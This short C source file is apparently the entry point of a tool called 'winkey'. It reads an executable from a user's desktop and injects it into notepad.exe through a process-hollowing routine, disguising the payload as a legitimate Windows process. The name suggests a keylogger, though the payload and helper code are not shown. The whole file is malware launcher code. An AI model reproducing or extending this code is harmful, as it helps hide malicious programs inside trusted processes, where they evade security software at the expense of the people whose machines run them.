#include "winkey.h"

int main(void)
{
	DWORD payloadSize = 0;

	LPVOID payload = load_pe_from_file(L"C:\\Users\\marcc\\Desktop\\winkey.exe", &payloadSize);
	if (!payload)
		return 1;
	if (!hollow_process(L"C:\\Windows\\System32\\notepad.exe", payload, payloadSize)) 
	{
		HeapFree(GetProcessHeap(), 0, payload);
		return 1;
	}
	HeapFree(GetProcessHeap(), 0, payload);
	return 0;
}
